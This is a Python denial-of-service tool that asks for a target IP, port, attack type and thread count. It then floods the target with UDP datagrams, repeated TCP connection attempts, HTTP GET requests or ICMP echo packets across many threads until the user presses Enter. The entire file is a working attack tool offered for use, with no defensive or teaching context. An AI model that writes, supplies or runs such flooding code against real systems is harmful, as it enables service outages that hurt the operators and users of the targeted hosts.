#!/usr/bin/python3

import socket
import threading
import time
import logging
import random

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def udp_flood(ip, port, stop_event):
    try:
        logging.info(f"Start UDP flooding {ip}:{port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_event.is_set():
            try:
                sock.sendto(b"X" * 65507, (ip, port))
                logging.info(f"Sent UDP packet to {ip}:{port}")
                time.sleep(0.001)
            except Exception as e:
                logging.error(f"Error during UDP packet sending: {str(e)}")
    except Exception as e:
        logging.error(f"Error during UDP attack: {str(e)}")
    finally:
        sock.close()

def syn_flood(ip, port, stop_event):
    try:
        logging.info(f"Start SYN flooding {ip}:{port}")
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.connect_ex((ip, port))  
                logging.info(f"Sent SYN packet to {ip}:{port}")
                time.sleep(0.01)
            except Exception as e:
                logging.error(f"Error during SYN packet sending: {str(e)}")
    except Exception as e:
        logging.error(f"Error during SYN attack: {str(e)}")

def http_flood(ip, port, stop_event):
    try:
        logging.info(f"Start HTTP flooding {ip}:{port}")
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
                sock.sendall(request.encode())
                logging.info(f"Sent HTTP request to {ip}:{port}")
                sock.close()
                time.sleep(0.01)
            except Exception as e:
                logging.error(f"Error during HTTP request sending: {str(e)}")
    except Exception as e:
        logging.error(f"Error during HTTP attack: {str(e)}")

def ping_flood(ip, stop_event):
    try:
        logging.info(f"Start Ping flooding {ip}")
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.sendto(b'\x08\x00\x00\x00\x00\x00\x00\x00', (ip, 0))  
                logging.info(f"Sent Ping to {ip}")
                time.sleep(0.01)
            except Exception as e:
                logging.error(f"Error during Ping sending: {str(e)}")
    except Exception as e:
        logging.error(f"Error during Ping attack: {str(e)}")

if __name__ == "__main__":
    ip = input("Enter Target IP: ")
    port = int(input("Enter Port [1-65535]: "))
    attack_type = input("Enter attack type (udp/syn/http/ping): ").strip().lower()
    thread_count = int(input("Enter number of Threads: "))
    while True:
        try:
            if 1 <= port <= 65535 and thread_count > 0:
                break
            else:
                print("Port number must be between 1 and 65535 and number of threads must be greater than 0.")
        except ValueError:
            print("Invalid input. Please enter valid numbers.")
    stop_event = threading.Event()
    threads = []
    attack_functions = {
        'udp': udp_flood,
        'syn': syn_flood,
        'http': http_flood,
        'ping': ping_flood
    }
    if attack_type not in attack_functions:
        print("Invalid attack type. Choose from 'udp', 'syn', 'http', 'ping'.")
    else:
        for _ in range(thread_count):
            thread = threading.Thread(target=attack_functions[attack_type], args=(ip, port, stop_event))
            thread.start()
            threads.append(thread)     
        try:
            input("Press Enter to stop the attack...")
        finally:
            stop_event.set()
        for thread in threads:
            thread.join()
        logging.info("Attack completed.")